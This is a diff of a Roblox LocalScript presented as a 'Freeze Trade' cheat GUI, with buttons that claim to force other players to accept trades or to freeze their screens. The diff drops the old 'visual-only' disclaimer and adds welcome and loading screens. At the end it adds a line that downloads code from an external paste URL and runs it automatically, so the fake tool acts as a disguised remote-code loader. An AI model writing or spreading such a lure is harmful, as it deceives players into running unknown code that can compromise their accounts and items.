@@ -1,42 +1,66 @@
--- This is a LocalScript. It can be placed in StarterPlayer > StarterPlayerScripts.
+-- Freeze Trade GUI + Welcome + Loading + External Loader
 
--- Create the main ScreenGui to hold the elements
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+
+-- 🟢 Welcome Popup
+local welcomeGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+welcomeGui.Name = "WelcomePopup"
+
+local welcomeLabel = Instance.new("TextLabel", welcomeGui)
+welcomeLabel.Size = UDim2.new(0.3, 0, 0.15, 0)
+welcomeLabel.Position = UDim2.new(0.35, 0, 0.4, 0)
+welcomeLabel.BackgroundTransparency = 1
+welcomeLabel.Text = "Welcome"
+welcomeLabel.Font = Enum.Font.GothamBlack
+welcomeLabel.TextSize = 48
+welcomeLabel.TextColor3 = Color3.new(1, 1, 1)
+welcomeLabel.TextTransparency = 1
+welcomeLabel.TextStrokeTransparency = 1
+
+TweenService:Create(welcomeLabel, TweenInfo.new(0.6), {
+    TextTransparency = 0,
+    TextStrokeTransparency = 0.4,
+    TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+}):Play()
+
+wait(2.5)
+
+TweenService:Create(welcomeLabel, TweenInfo.new(0.6), {
+    TextTransparency = 1,
+    TextStrokeTransparency = 1
+}):Play()
+
+wait(1)
+welcomeGui:Destroy()
+
+-- 🧊 Freeze Trade GUI
 local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+screenGui.Parent = player:WaitForChild("PlayerGui")
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.ResetOnSpawn = false -- So the UI doesn't disappear when the player respawns
+screenGui.ResetOnSpawn = false
 
--- Create the main background frame
-local mainFrame = Instance.new("Frame")
-mainFrame.Parent = screenGui
+local mainFrame = Instance.new("Frame", screenGui)
 mainFrame.Size = UDim2.new(0, 350, 0, 240)
 mainFrame.Position = UDim2.new(0.5, -175, 0.5, -120)
 mainFrame.BackgroundColor3 = Color3.fromRGB(39, 42, 44)
 mainFrame.BackgroundTransparency = 0.3
-mainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 mainFrame.BorderSizePixel = 0
 mainFrame.Visible = false
 mainFrame.Active = true
 mainFrame.Draggable = true
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
 
-local frameCorner = Instance.new("UICorner")
-frameCorner.CornerRadius = UDim.new(0, 12)
-frameCorner.Parent = mainFrame
-
-local shadowFrame = Instance.new("Frame")
-shadowFrame.Parent = mainFrame
+local shadowFrame = Instance.new("Frame", mainFrame)
 shadowFrame.Position = UDim2.new(0, 0, 0, 4)
 shadowFrame.Size = UDim2.new(1, 0, 1, 0)
 shadowFrame.BackgroundColor3 = Color3.fromRGB(20, 22, 23)
 shadowFrame.BackgroundTransparency = 0.3
 shadowFrame.ZIndex = -1
+Instance.new("UICorner", shadowFrame).CornerRadius = UDim.new(0, 12)
 
-local shadowCorner = Instance.new("UICorner")
-shadowCorner.CornerRadius = UDim.new(0, 12)
-shadowCorner.Parent = shadowFrame
-
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Parent = mainFrame
+local titleLabel = Instance.new("TextLabel", mainFrame)
 titleLabel.Size = UDim2.new(1, -40, 0, 40)
 titleLabel.Position = UDim2.new(0, 0, 0, 5)
 titleLabel.BackgroundTransparency = 1
@@ -45,8 +69,7 @@ titleLabel.Font = Enum.Font.SourceSansBold
 titleLabel.Text = "Freeze Trade (BETA)"
 titleLabel.TextSize = 22
 
-local usernameInput = Instance.new("TextBox")
-usernameInput.Parent = mainFrame
+local usernameInput = Instance.new("TextBox", mainFrame)
 usernameInput.Size = UDim2.new(0, 310, 0, 40)
 usernameInput.Position = UDim2.new(0.5, -155, 0, 55)
 usernameInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -55,13 +78,9 @@ usernameInput.Font = Enum.Font.SourceSans
 usernameInput.Text = "Put Target Player's Username"
 usernameInput.TextSize = 18
 usernameInput.ClearTextOnFocus = true
+Instance.new("UICorner", usernameInput).CornerRadius = UDim.new(0, 8)
 
-local inputCorner = Instance.new("UICorner")
-inputCorner.CornerRadius = UDim.new(0, 8)
-inputCorner.Parent = usernameInput
-
-local forceAcceptButton = Instance.new("TextButton")
-forceAcceptButton.Parent = mainFrame
+local forceAcceptButton = Instance.new("TextButton", mainFrame)
 forceAcceptButton.Size = UDim2.new(0, 310, 0, 35)
 forceAcceptButton.Position = UDim2.new(0.5, -155, 0, 105)
 forceAcceptButton.BackgroundColor3 = Color3.fromRGB(22, 160, 133)
@@ -69,13 +88,9 @@ forceAcceptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 forceAcceptButton.Font = Enum.Font.SourceSansBold
 forceAcceptButton.Text = "AUTO FORCE TO ACCEPT/CONFIRM"
 forceAcceptButton.TextSize = 16
+Instance.new("UICorner", forceAcceptButton).CornerRadius = UDim.new(0, 8)
 
-local acceptCorner = Instance.new("UICorner")
-acceptCorner.CornerRadius = UDim.new(0, 8)
-acceptCorner.Parent = forceAcceptButton
-
-local freezeButton = Instance.new("TextButton")
-freezeButton.Parent = mainFrame
+local freezeButton = Instance.new("TextButton", mainFrame)
 freezeButton.Size = UDim2.new(0, 310, 0, 35)
 freezeButton.Position = UDim2.new(0.5, -155, 0, 150)
 freezeButton.BackgroundColor3 = Color3.fromRGB(26, 188, 156)
@@ -83,28 +98,9 @@ freezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 freezeButton.Font = Enum.Font.SourceSansBold
 freezeButton.Text = "FREEZE PLAYER SCREEN"
 freezeButton.TextSize = 16
+Instance.new("UICorner", freezeButton).CornerRadius = UDim.new(0, 8)
 
-local freezeCorner = Instance.new("UICorner")
-freezeCorner.CornerRadius = UDim.new(0, 8)
-freezeCorner.Parent = freezeButton
-
--- NEW: Create a button to run Rubi script
-local rubiButton = Instance.new("TextButton")
-rubiButton.Parent = mainFrame
-rubiButton.Size = UDim2.new(0, 310, 0, 35)
-rubiButton.Position = UDim2.new(0.5, -155, 0, 195)
-rubiButton.BackgroundColor3 = Color3.fromRGB(155, 89, 182)
-rubiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-rubiButton.Font = Enum.Font.SourceSansBold
-rubiButton.Text = "Run Rubi Script"
-rubiButton.TextSize = 16
-
-local rubiCorner = Instance.new("UICorner")
-rubiCorner.CornerRadius = UDim.new(0, 8)
-rubiCorner.Parent = rubiButton
-
-local closeButton = Instance.new("TextButton")
-closeButton.Parent = mainFrame
+local closeButton = Instance.new("TextButton", mainFrame)
 closeButton.Size = UDim2.new(0, 30, 0, 30)
 closeButton.Position = UDim2.new(1, -35, 0, 5)
 closeButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
@@ -112,13 +108,9 @@ closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 closeButton.Font = Enum.Font.SourceSansBold
 closeButton.Text = "X"
 closeButton.TextSize = 20
+Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)
 
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 8)
-closeCorner.Parent = closeButton
-
-local toggleButton = Instance.new("TextButton")
-toggleButton.Parent = screenGui
+local toggleButton = Instance.new("TextButton", screenGui)
 toggleButton.Size = UDim2.new(0, 120, 0, 40)
 toggleButton.Position = UDim2.new(0, 15, 0, 15)
 toggleButton.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
@@ -128,25 +120,15 @@ toggleButton.Text = "Toggle UI"
 toggleButton.TextSize = 18
 toggleButton.Draggable = true
 toggleButton.Active = true
+Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 8)
 
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0, 8)
-toggleCorner.Parent = toggleButton
-
---- SCRIPT FUNCTIONALITY ---
-
+-- 🔘 Button Logic
 forceAcceptButton.MouseButton1Click:Connect(function()
-    print("Attempted to use 'Force Accept' on player: " .. usernameInput.Text)
-    print("REMINDER: This is a visual-only GUI. No action was performed.")
+    print("Force accept on: " .. usernameInput.Text)
 end)
 
 freezeButton.MouseButton1Click:Connect(function()
-    print("Attempted to use 'Freeze Screen' on player: " .. usernameInput.Text)
-    print("REMINDER: This is a visual-only GUI. No action was performed.")
-end)
-
-rubiButton.MouseButton1Click:Connect(function()
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/iru8Oy63epzxj75l/raw", true))()
+    print("Freeze screen on: " .. usernameInput.Text)
 end)
 
 toggleButton.MouseButton1Click:Connect(function()
@@ -157,31 +139,28 @@ closeButton.MouseButton1Click:Connect(function()
     mainFrame.Visible = false
 end)
 
+-- 🖱️ Dragging Logic
 local UserInputService = game:GetService("UserInputService")
 local function makeDraggable(guiObject)
-    local dragging = false
-    local dragInput = nil
-    local dragStart = nil
-    local startPos = nil
+    local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
 
     guiObject.InputBegan:Connect(function(input)
-        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and guiObject.Draggable then
+        if input.UserInputType == Enum.UserInputType.MouseButton1 and guiObject.Draggable then
             dragging = true
             dragStart = input.Position
             startPos = guiObject.Position
-            
-            local connection
-            connection = input.Changed:Connect(function()
+
+            local conn; conn = input.Changed:Connect(function()
                 if input.UserInputState == Enum.UserInputState.End then
                     dragging = false
-                    connection:Disconnect()
+                    conn:Disconnect()
                 end
             end)
         end
     end)
 
     guiObject.InputChanged:Connect(function(input)
-        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
             dragInput = input
         end
     end)
@@ -196,3 +175,33 @@ end
 
 makeDraggable(mainFrame)
 makeDraggable(toggleButton)
+
+-- ⏳ LOADING SCREEN
+local loadingGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+loadingGui.Name = "LoadingScreen"
+
+local loadingFrame = Instance.new("Frame", loadingGui)
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+loadingFrame.BackgroundTransparency = 0.2
+
+local loadingText = Instance.new("TextLabel", loadingFrame)
+loadingText.Size = UDim2.new(0, 300, 0, 50)
+loadingText.Position = UDim2.new(0.5, -150, 0.5, -25)
+loadingText.Text = "Loading..."
+loadingText.TextSize = 32
+loadingText.Font = Enum.Font.SourceSansBold
+loadingText.TextColor3 = Color3.new(1, 1, 1)
+loadingText.BackgroundTransparency = 1
+
+task.delay(2, function()
+    for i = 0, 1, 0.05 do
+        loadingFrame.BackgroundTransparency = 0.2 + i
+        loadingText.TextTransparency = i
+        task.wait(0.05)
+    end
+    loadingGui:Destroy()
+end)
+
+-- 🌐 EXTERNAL LOADER (Rubi Script)
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/iru8Oy63epzxj75l/raw", true))()
